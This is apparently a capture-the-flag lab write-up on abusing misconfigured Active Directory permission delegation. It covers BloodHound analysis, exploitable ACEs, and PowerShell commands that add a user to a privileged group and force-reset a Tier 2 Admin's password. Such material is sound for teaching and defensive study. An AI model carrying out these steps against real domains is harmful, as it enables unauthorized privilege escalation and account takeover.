# Exploiting Permission Delegation in Active Directory

Active Directory (AD) can delegate permissions and privileges through a feature called **Permission Delegation** (not to be confused with Kerberos Delegation, which will be discussed later). Delegation is what makes AD so powerful in large organizations. For example, in a company with 50,000 employees, only a few users might have Domain Admin (DA) credentials. Handling all user requests, such as password resets, would be impossible for just those users. With Delegation, specific permissions (like resetting passwords) can be assigned to groups such as the Helpdesk team. To keep Delegation secure, the principle of least privilege should be followed, but this is challenging in large environments. This section explores how misconfigurations in Delegation can be exploited.

---

## Permission Delegation and ACL-Based Attacks

Permission Delegation exploits are often called **ACL-based attacks**. AD administrators can configure **Access Control Entries (ACEs)**, which populate **Discretionary Access Control Lists (DACLs)**. These ACEs define allowed and denied permissions for AD objects.

If ACEs are misconfigured, attackers can exploit them. For example, if the IT Support team is granted the `ForceChangePassword` ACE over the Domain Users group, they could reset passwords for privileged accounts, leading to privilege escalation.

---

## Common Exploitable ACEs

A variety of ACEs can be misconfigured. Some notable ones include:

- **ForceChangePassword**: Set a user's password without knowing the current one.
- **AddMembers**: Add users, groups, or computers to a target group.
- **GenericAll**: Full control over the object (change password, register SPN, add objects, etc.).
- **GenericWrite**: Update any non-protected parameters (e.g., `scriptPath`).
- **WriteOwner**: Change the owner of the object, gaining additional permissions.
- **WriteDACL**: Write new ACEs to the object's DACL (e.g., grant full control).
- **AllExtendedRights**: Perform any action associated with extended AD rights (e.g., force password change).

To exploit these ACEs, tools like **AD-RSAT PowerShell cmdlets** or **PowerSploit** are commonly used. The choice depends on the breach and detection tools in the environment.

---

## Using Bloodhound

**Sharphound** has already been executed and the data is provided. To analyze it:

1. Start Neo4j:
    ```bash
    neo4j console start
    ```
2. In another terminal, run Bloodhound:
    ```bash
    bloodhound --no-sandbox
    ```
3. Login to Bloodhound (default Neo4j credentials: `neo4j:neo4j`).
4. Drag and drop the provided ZIP files into Bloodhound to ingest the data.

Once ingested, you can enumerate attack paths.

---

## Privilege Escalation Example

Suppose your user account (from Task 1) has limited permissionsâ€”only RDP access to `THMWRK1` (low privilege). The goal is to escalate privileges by compromising the **Tier 2 Admins** group, which has admin rights on all workstations.

### Attack Path Discovery

Bloodhound may reveal that:

- The **IT Support** group has been misconfigured, granting the **Domain Users** group the `AddMembers` ACE.
- The **IT Support** group has the `ForceChangePassword` ACE over the **Tier 2 Admins** group.

This chain allows privilege escalation.

---

## Step 1: Add Yourself to IT Support

Use the `Add-ADGroupMember` PowerShell cmdlet:

```powershell
Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
```

Verify membership:

```powershell
Get-ADGroupMember -Identity "IT Support"
```

---

## Step 2: Identify Tier 2 Admins

List members of the Tier 2 Admins group:

```powershell
Get-ADGroupMember -Identity "Tier 2 Admins"
```

Note a username to target.

---

## Step 3: Force Change a Tier 2 Admin's Password

Set a new password for the target account:

```powershell
$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force
Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password
```

> **Note:** If you get an Access Denied error, permissions may not have propagated. Wait up to 10 minutes, or run `gpupdate /force` and reconnect.

---

## Step 4: Authenticate as Tier 2 Admin

You can now authenticate to `THMWRK1` using the target account and new password. You have escalated privileges to Tier 2 Administrator by exploiting Permission Delegations.

---